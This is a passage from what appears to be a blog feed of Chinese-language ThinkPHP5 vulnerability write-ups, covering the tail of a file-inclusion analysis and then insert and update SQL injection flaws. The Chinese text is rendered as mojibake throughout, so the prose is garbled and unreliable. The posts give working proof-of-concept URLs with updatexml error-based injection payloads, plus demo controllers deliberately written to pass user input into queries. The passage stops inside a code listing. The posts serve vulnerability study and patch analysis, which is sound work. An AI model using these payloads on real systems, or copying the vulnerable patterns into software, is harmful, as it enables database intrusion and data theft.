å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«<code>get</code>æ–¹æ³•è·å–ï¼Œç„¶åè°ƒç”¨äº†<code>input</code>æ–¹æ³•å’Œé€’å½’è°ƒç”¨<code>filterValue</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•è¿˜ä¼šç»§ç»­è°ƒç”¨<code>filterExp</code> æ–¹æ³•å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åè¿”å›ç»™<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>ç„¶åå†è°ƒç”¨<code>assign</code> æ–¹æ³•ï¼Œè¿”å›å¤„ç†åçš„æ•°æ®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>å› æ­¤ç”¨æˆ·çš„æ•°æ®è¾“å…¥ï¼Œç»è¿‡<code>get</code>æ–¹æ³•å’Œ<code>assign</code>æ–¹æ³•åï¼Œè¿”å›çš„å†…å®¹ä¸º<code>cacheFile=favico.ico</code> ï¼Œç„¶åç¨‹åºç»§ç»­è°ƒç”¨<code>fetch</code>æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚</p><blockquote><p>fetchæ–¹æ³•ç”¨äºåŠ è½½æ¨¡æ¿è¾“å‡ºã€‚è¿™é‡Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šæ¨¡æ¿åç§°ï¼Œå…¶ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶ä½œä¸ºæ¨¡æ¿ï¼Œæ¨¡æ¿è·¯å¾„ç±»ä¼¼ <strong>å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</strong> ï¼Œå¦‚æœé»˜è®¤è·¯å¾„æ¨¡æ¿ä¸å­˜åœ¨ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>è·Ÿè¿›åˆ° <strong>Template</strong> ç±»çš„ <strong>fetch</strong> æ–¹æ³•ï¼Œå¯ä»¥å‘ç°å¯æ§å˜é‡ <strong>$vars</strong> èµ‹å€¼ç»™ <strong>$this-&gt;data</strong> å¹¶æœ€ç»ˆä¼ å…¥ <strong>File</strong> ç±»çš„ <strong>read</strong> æ–¹æ³•ã€‚è€Œ <strong>read</strong> æ–¹æ³•ä¸­åœ¨ä½¿ç”¨äº† <strong>extract</strong> å‡½æ•°åï¼Œç›´æ¥åŒ…å«äº† <strong>$cacheFile</strong> å˜é‡ã€‚è¿™é‡Œå°±æ˜¯æ¼æ´å‘ç”Ÿçš„å…³é”®åŸå› ï¼ˆå¯ä»¥é€šè¿‡ <strong>extract</strong> å‡½æ•°ï¼Œç›´æ¥è¦†ç›– <strong>$cacheFile</strong> å˜é‡ï¼Œå› ä¸º <strong>extract</strong> å‡½æ•°ä¸­çš„å‚æ•° <strong>$vars</strong> å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>æ–¹æ³•è°ƒç”¨æ ˆï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;a href=&quot;#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;/a&gt;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -SQLæ³¨å…¥</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2020-09-23T03:04:24.409Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>ç¯å¢ƒå‡†å¤‡ï¼š</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>ç¯å¢ƒæ­å»ºå¯ä»¥çœ‹æˆ‘å‰ä¸¤ç¯‡æ–‡ç« ã€‚</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>è·å–å¤ç°ä»£ç </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL æ³¨å…¥demo ç¯å¢ƒ</li></ul><p>ä¿®æ”¹<code>/application/index/controller/index.php</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ¨¡æ‹Ÿè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç”¨æˆ·ä¼ å‚å¹¶ä¸æ•°æ®åº“äº¤äº’çš„åœºæ™¯ã€‚</p></blockquote><p>å¯èƒ½ä¼šå­˜åœ¨ï¼ŒSQL æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>ä¿®æ”¹username å­—æ®µé»˜è®¤ä¸º<code>NULL</code>  å³å¯è§£å†³é—®é¢˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQLæ³¨å…¥ä¸€-insert"><a href="#SQLæ³¨å…¥ä¸€-insert" class="headerlink" title="SQLæ³¨å…¥ä¸€(insert)"></a>SQLæ³¨å…¥ä¸€(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> ã€ <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Builder</strong> ç±»çš„ <strong>parseData</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><p>ç±»å‹ï¼š<code>insert</code> æ³¨å…¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p>ä»æ¼æ´å½±å“ç‰ˆæœ¬å¯ä»¥å»æ‰¾ å·²ç»ä¿®å¤åçš„ç‰ˆæœ¬ï¼Œ<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>é€šè¿‡github çš„<code>compare</code>åŠŸèƒ½ï¼Œå³å¯æŸ¥çœ‹ä»£ç å‘ç”Ÿäº†å“ªäº›ä¿®æ”¹ã€‚</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>åœ¨<code>/thinkphp/library/think/db/Connection.php</code> çš„ 314ï¼Œ 316 è¡Œä¸‹æ–­ç‚¹Debugï¼Œæ‰“payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>åŒæ—¶æˆåŠŸæ”»å‡»çš„Payload æ‰€åœ¨çš„å‚æ•°ä½äº <code>username[1]</code> çš„ <code>value</code>  ã€‚</p><p>æ”»å‡»Payload ç»è¿‡ThinkPHP çš„å†…ç½®è¿‡æ»¤åï¼Œè¿›å…¥<code>$this-&gt;builder</code> çš„<code>Query</code> ç±»çš„<code>insert</code> æ–¹æ³•ï¼Œæ‰§è¡Œå…¶ä¸­çš„SQLè¯­å¥ï¼Œå¹¶åœ¨åé¢è¿”å›å‡ºäº†æ‰§è¡Œç»“æœã€‚å› ä¸ºPayloadåˆ©ç”¨<code>updatexml()</code>æ¥æŠ¥é”™ï¼Œå› æ­¤å¿…é¡»å¼€å¯<code>app_debug</code> æ¥å¼€å¯SQL æŠ¥é”™ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(å¦‚ä¸Šå›¾debug ç»“æœä¸­Query.phpï¼‰ï¼Œ<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ï¼Œ<code>Query</code> çš„å®šä¹‰ä½äº <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>åœ¨<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ï¼Œå³ä¸Šé¢çš„ <strong>$this-&gt;builder-&gt;insert()</strong> æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <strong>Builder</strong> ç±»çš„ <strong>insert</strong> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>æ–¹æ³•è°ƒç”¨<code>parseData()</code>æ–¹æ³•æ¥åˆ†æå¹¶å¤„ç†æ•°æ®ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ã€‚</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>åœ¨<code>inc</code> å’Œ <code>dec</code> çš„ æƒ…å†µä¸‹ï¼Œå°†å¯æ§æ•°æ®<code>$val[1]</code>é€šè¿‡<code>parseKey</code>æ–¹æ³•å¤„ç†åï¼Œè¿›è¡Œæ‹¼æ¥ï¼Œå¹¶è¿”å›<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>æ–¹æ³• ä¸åšä»»ä½•å¤„ç†ï¼Œæ˜¯ç›´æ¥è¿”å›å€¼çš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><blockquote><p>å› æ­¤ï¼Œå¸¦æœ‰æ¶æ„SQL è¯­å¥çš„Payloadï¼Œè¢«æ‹¼æ¥ä¸”æ²¡ä»»ä½•å­—ç¬¦ä¸²å½¢å¼å¤„ç†åœ¨Builderç±»çš„insertæ–¹æ³•ä¸­ï¼Œé€šè¿‡str_replaceå‡½æ•°ç›´æ¥æ›¿æ¢ï¼Œè¿”å›sqlï¼Œå¸¦å…¥SQLè¯­å¥ä¸­è¢«æ‰§è¡Œï¼Œé€ æˆäº†SQLæ³¨å…¥æ¼æ´ã€‚</p></blockquote><p>åœ¨<code>thinkphp/library/think/Request.php</code> ä¸­ï¼Œæœ‰è°ƒç”¨å†…ç½®è¿‡æ»¤ï¼ˆç›´æ¥æ›¿æ¢ä¸ºç©ºï¼‰æ–¹æ³•ï¼Œå¯¹å‚æ•°<code>exp</code>è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨case <code>exp</code>çš„æƒ…å†µä¸‹ï¼Œæ— æ³•é€ æˆæ¼æ´ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>é—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸èƒ½å°†æ¶æ„Payload ç”¨<code>username[2]</code> æ¥æŠ•é€’ï¼Ÿ</p><p>åŸå› ï¼š</p><p>åŒæ ·çš„åŠæ³•ï¼Œä¸‹æ–­ç‚¹ï¼Œdebug å¯ä»¥çœ‹åˆ°ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>å›åˆ°ä¹‹å‰çš„<code>parseDate</code> æ–¹æ³•ï¼Œ<code>username[2]</code>çš„å€¼é€šè¿‡<code>floatval</code>å‡½æ•°å¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload å˜ä¸ºäº†<code>0</code> ï¼Œä¸” ä¼šå­˜åœ¨SQL é”™è¯¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQLæ³¨å…¥äºŒ-update"><a href="#SQLæ³¨å…¥äºŒ-update" class="headerlink" title="SQLæ³¨å…¥äºŒ(update)"></a>SQLæ³¨å…¥äºŒ(update)</h1><p>å¤ç°ä»£ç è·å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>../config/app.php</code> ä¸­ï¼Œéœ€è¦ä¿®æ”¹<code>app_trace</code> ä¸ºtrueï¼Œ <code>app_debug</code> é»˜è®¤å¼€å¯äº†ã€‚</p><p>åˆ›å»ºæ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿè¦è®¾ç½®username å­—æ®µ ä¸º<code>NULL</code> æ‰è¡Œ</p><p>ä¿®æ”¹<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>å¾ˆSQL æ³¨å…¥ä¸€éå¸¸ç±»ä¼¼ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (éæœ€æ–°çš„ <strong>5.1.8</strong> ç‰ˆæœ¬ä¹Ÿå¯åˆ©ç”¨)ã€‚</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Mysql</strong> ç±»çš„ <strong>parseArrayData</strong> æ–¹æ³•ä¸­ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿ</p><p>æ³¨å…¥ç±»å‹ï¼š<code>update</code> æ³¨å…¥</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>ä¸‹æ–­ç‚¹ï¼Œdebugã€‚è§‚å¯Ÿå‚æ•°ä¼ é€’è¿‡ç¨‹</li><li>ç›‘æ§MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>ä¸‹æ–­ç‚¹ï¼Œå¼€å¯Debugï¼Œæ‰“Payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" alt="image-20200914173011583"></p><p><code>../thinkphp/library/think/db/Query.php</code> ä¸­ï¼ŒPayload ä¼ å…¥Query ç±»çš„ <code>update</code>æ–¹æ³•ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>Connection</code> ç±»çš„è¯¥æ–¹æ³•ä¸º<code>update</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆè°ƒç”¨äº† </p><p><code>$this-&gt;builder</code> çš„<code>update</code> æ–¹æ³•ï¼Œæ­¤å¤„çš„<code>$this-&gt;builder</code> ä¸ºä¸º<code>think\db\builder\Mysql</code> ç±»ã€‚<code>class Mysql extends Builder</code> ï¼Œè¯¥ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202201.png" alt="image-20200914170732409"></p><p>åœ¨<code>Builder</code>ç±»ä¸­çš„<code>update</code>æ–¹æ³•ï¼Œè°ƒç”¨äº†<code>parseData</code>æ–¹æ³•ï¼Œï¼ˆæ­£å¦‚ä¸Šå›¾debugç»“æœã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202036.png" alt="image-20200914184754350"></p><p>åœ¨è¯¥æ–¹æ³•ä¸­çš„<code>swich</code>è¯­å¥ä¸­ï¼Œä¹‹å‰å‡ºç°è¿‡æ¼æ´ï¼Œç°åœ¨å¤šäº†ä¸€æ¡default è¯­å¥ã€‚è€Œåœ¨æ–°ç‰ˆæœ¬ä¸­è¢«åˆ é™¤äº†ã€‚</p><p>è·Ÿè¿›åˆ°<code>parseData</code> æ–¹æ³•ï¼Œå‘ç°Payload åˆè¢«<code>parseArrayData</code>æ–¹æ³•å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202026.png" alt="image-20200914185836504"></p><p>åœ¨<code>../thinkphp/library/think/db/builder/Mysql.php</code> ä¸­çš„ 200 è¡Œè¿”å›result çš„åœ°æ–¹æ‰“æ–­ç‚¹ï¼Œè°ƒè¯•ç»“æœå¦‚ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202011.png"></p><p>æ­¤å¤„å°†å¯æ§å˜é‡ç»è¿‡æ‹¼æ¥åè¢«å¸¦å…¥æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914201959.png" alt="image-20200914193548748"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseArrayData</span>(<span class="params">Query $query, $data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">list</span>($type, $value) = $data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (strtolower($type)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;point&#x27;</span>:</span><br><span class="line">            $fun   = <span class="keyword">isset</span>($data[<span class="number">2</span>]) ? $data[<span class="number">2</span>] : <span class="string">&#x27;GeomFromText&#x27;</span>;</span><br><span class="line">            $point = <span class="keyword">isset</span>($data[<span class="number">3</span>]) ? $data[<span class="number">3</span>] : <span class="string">&#x27;POINT&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                $value = implode(<span 